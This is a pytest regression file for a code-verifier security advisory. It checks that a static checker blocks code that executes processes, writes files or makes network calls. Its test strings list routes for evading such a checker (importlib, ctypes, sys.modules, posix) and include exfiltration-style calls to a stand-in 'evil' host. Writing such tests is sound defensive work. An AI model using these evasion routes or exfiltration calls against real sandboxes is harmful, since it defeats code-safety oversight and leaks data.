"""GHSA-4phf-6h72-9xfg: CodeVerifier.verify_code returned VERIFIED/ADMIT for code
that runs commands, reads/writes files, or sends data out (incomplete fix of
GHSA-6rxr-gq43-694g).

The static verdict is is_safe = critical_count == 0, so anything classified
WARNING or missed entirely was admitted. This covers:
  - process execution reached WITHOUT importing os/subprocess directly
    (importlib / ctypes / sys.modules / posix|nt / os.fork / runpy),
  - file and network sinks (policy: CRITICAL, not WARNING),
  - the JavaScript / Go process-execution forms that were WARNING-only.

Harmless placeholders (`id`/`true`, example hosts) — nothing is executed.
"""
import pytest

from qwed_new.core.code_verifier import CodeVerifier
from qwed_new.core.diagnostics import admission_decision


def _fields(code, language="python"):
    return CodeVerifier().verify_code(code, language).developer_fields


# --- process execution through alternate routes --------------------------------

PROCESS_ROUTES = [
    'import importlib\nimportlib.import_module("os").system("id")',
    'import importlib as il\nil.import_module("os").system("id")',
    'import ctypes\nctypes.CDLL("libc.so.6").system(b"id")',
    'import sys\nsys.modules["os"].system("id")',
    "import os\nos.fork()",
    'import runpy\nrunpy.run_module("evil")',
    'import posix\nposix.system("id")',
    'import posix as p\np.system("id")',
    'import nt\nnt.system("id")',
]


@pytest.mark.parametrize("code", PROCESS_ROUTES)
def test_process_execution_routes_are_blocked(code):
    f = _fields(code)
    assert f["is_safe"] is False, f
    assert f["critical_count"] >= 1
    assert admission_decision(CodeVerifier().verify_code(code)).value == "BLOCKED"


# --- file and network sinks (now CRITICAL) -------------------------------------

FILE_NETWORK = [
    'f = open("/etc/secret", "w")\nf.write("x")',      # builtin open
    'import io\nio.open("/etc/secret", "w")',
    'import shutil\nshutil.copy("/a", "/b")',
    'import os\nos.remove("/important")',
    'import socket\ns = socket.socket()\ns.connect(("evil", 80))',
    'import urllib.request\nurllib.request.urlopen("http://evil/exfil")',
    'import requests\nrequests.post("http://evil", data=secret)',
    'import http.client\nhttp.client.HTTPConnection("evil")',
]


@pytest.mark.parametrize("code", FILE_NETWORK)
def test_file_and_network_access_is_blocked(code):
    f = _fields(code)
    assert f["is_safe"] is False, f
    assert f["critical_count"] >= 1


# --- other languages -----------------------------------------------------------

def test_javascript_child_process_is_critical():
    code = "const child_process = require('child_process');\nchild_process.exec('id');"
    assert _fields(code, "javascript")["is_safe"] is False


def test_go_syscall_process_creation_is_critical():
    assert _fields('syscall.ForkExec("/bin/sh", a, b)', "go")["is_safe"] is False


# --- controls: computation that touches no process/file/network still verifies --

@pytest.mark.parametrize("code", [
    "def add(a, b):\n    return a + b\n",
    "import os\nprint(os.path.join('a', 'b'))\n",       # path strings, not I/O
    "from os import path\nprint(path.basename('/tmp/x'))\n",
    "import asyncio\nasyncio.run(main())\n",             # not create_subprocess_*
    "total = sum(range(10))\n",
])
def test_pure_computation_still_verifies(code):
    f = _fields(code)
    assert f["is_safe"] is True, f["issues"]
    assert admission_decision(CodeVerifier().verify_code(code)).value == "ADMIT"
